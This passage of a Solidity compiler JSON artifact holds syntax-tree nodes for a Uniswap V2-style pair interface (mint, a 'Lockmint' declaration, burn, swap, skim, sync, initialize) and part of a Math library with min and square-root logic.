												"id": 783,
												"name": "blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2156:25:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 782,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2156:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2119:63:4"
									},
									"scope": 852,
									"src": "2050:133:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 790,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price0CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 786,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2218:2:4"
									},
									"returnParameters": {
										"id": 789,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 788,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 790,
												"src": "2244:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 787,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2244:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2243:9:4"
									},
									"scope": 852,
									"src": "2189:64:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 795,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price1CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 791,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2288:2:4"
									},
									"returnParameters": {
										"id": 794,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 793,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 795,
												"src": "2314:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 792,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2314:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2313:9:4"
									},
									"scope": 852,
									"src": "2259:64:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 800,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "kLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 796,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2343:2:4"
									},
									"returnParameters": {
										"id": 799,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 798,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 800,
												"src": "2369:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 797,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2369:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2368:9:4"
									},
									"scope": 852,
									"src": "2329:49:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 807,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 803,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 802,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 807,
												"src": "2398:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 801,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2398:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2397:12:4"
									},
									"returnParameters": {
										"id": 806,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 805,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 807,
												"src": "2428:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 804,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2428:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2427:19:4"
									},
									"scope": 852,
									"src": "2384:63:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 814,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 810,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 809,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 814,
												"src": "2471:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 808,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2471:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2470:12:4"
									},
									"returnParameters": {
										"id": 813,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 812,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 814,
												"src": "2501:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 811,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2501:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2500:19:4"
									},
									"scope": 852,
									"src": "2453:67:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 823,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 817,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 816,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2559:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 815,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2559:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2549:26:4"
									},
									"returnParameters": {
										"id": 822,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 819,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2594:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 818,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2594:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 821,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2611:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 820,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2611:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2593:34:4"
									},
									"scope": 852,
									"src": "2536:92:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 834,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 832,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 825,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2657:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 824,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2657:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 827,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2685:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 826,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2685:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 829,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2713:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 828,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2713:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 831,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2733:19:4",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 830,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "2733:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2647:111:4"
									},
									"returnParameters": {
										"id": 833,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2767:0:4"
									},
									"scope": 852,
									"src": "2634:134:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 839,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 837,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 836,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 839,
												"src": "2788:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 835,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2788:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2787:12:4"
									},
									"returnParameters": {
										"id": 838,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2808:0:4"
									},
									"scope": 852,
									"src": "2774:35:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 842,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 840,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2828:2:4"
									},
									"returnParameters": {
										"id": 841,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2839:0:4"
									},
									"scope": 852,
									"src": "2815:25:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 851,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 849,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 844,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2866:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 843,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2866:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 846,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2875:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 845,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2875:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 848,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2884:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 847,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2884:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2865:24:4"
									},
									"returnParameters": {
										"id": 850,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2898:0:4"
									},
									"scope": 852,
									"src": "2846:53:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 853,
							"src": "62:2849:4"
						}
					],
					"src": "36:2876:4"
				},
				"id": 4
			},
			"src/Math.sol": {
				"ast": {
					"absolutePath": "src/Math.sol",
					"exportedSymbols": {
						"Math": [
							928
						]
					},
					"id": 929,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 854,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:5"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 928,
							"linearizedBaseContracts": [
								928
							],
							"name": "Math",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 872,
										"nodeType": "Block",
										"src": "203:34:5",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 870,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 863,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 861,
														"src": "213:1:5",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 866,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 864,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 856,
																"src": "217:1:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"id": 865,
																"name": "y",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 858,
																"src": "221:1:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "217:5:5",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseExpression": {
															"argumentTypes": null,
															"id": 868,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 858,
															"src": "229:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 869,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "Conditional",
														"src": "217:13:5",
														"trueExpression": {
															"argumentTypes": null,
															"id": 867,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 856,
															"src": "225:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "213:17:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 871,
												"nodeType": "ExpressionStatement",
												"src": "213:17:5"
											}
										]
									},
									"documentation": null,
									"id": 873,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "min",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 859,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 856,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "147:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 855,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "147:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 858,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "158:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 857,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "158:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "146:22:5"
									},
									"returnParameters": {
										"id": 862,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 861,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "192:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 860,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "192:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "191:11:5"
									},
									"scope": 928,
									"src": "134:103:5",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 926,
										"nodeType": "Block",
										"src": "411:242:5",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 882,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 880,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 875,
														"src": "425:1:5",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "33",
														"id": 881,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "429:1:5",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_3_by_1",
															"typeString": "int_const 3"
														},
														"value": "3"
													},
													"src": "425:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 918,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 916,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 875,
															"src": "609:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 917,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "614:1:5",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "609:6:5",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 924,
													"nodeType": "IfStatement",
													"src": "605:42:5",
													"trueBody": {
														"id": 923,
														"nodeType": "Block",
														"src": "617:30:5",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 921,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 919,
																		"name": "z",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 878,
																		"src": "631:1:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "31",
																		"id": 920,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "635:1:5",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "631:5:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 922,
																"nodeType": "ExpressionStatement",
																"src": "631:5:5"
															}
														]
													}
												},
												"id": 925,
												"nodeType": "IfStatement",
												"src": "421:226:5",
												"trueBody": {
													"id": 915,
													"nodeType": "Block",
													"src": "432:167:5",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 885,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 883,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 878,
																	"src": "446:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 884,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 875,
																	"src": "450:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "446:5:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 886,
															"nodeType": "ExpressionStatement",
															"src": "446:5:5"
														},
														{
															"assignments": [
																888
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 888,
																	"name": "x",
																	"nodeType": "VariableDeclaration",
																	"scope": 915,
																	"src": "465:9:5",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 887,
																		"name": "uint256",
																		"nodeType": "ElementaryTypeName",
																		"src": "465:7:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 894,
															"initialValue": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 893,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 891,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 889,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 875,
																		"src": "477:1:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 890,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "481:1:5",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "477:5:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "+",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 892,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "485:1:5",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "477:9:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "465:21:5"
														},
														{
															"body": {
																"id": 913,
																"nodeType": "Block",
																"src": "514:75:5",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 900,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 898,
																				"name": "z",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 878,
																				"src": "532:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"id": 899,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 888,
																				"src": "536:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "532:5:5",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 901,
																		"nodeType": "ExpressionStatement",
																		"src": "532:5:5"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 911,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 902,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 888,
																				"src": "555:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"commonType": {
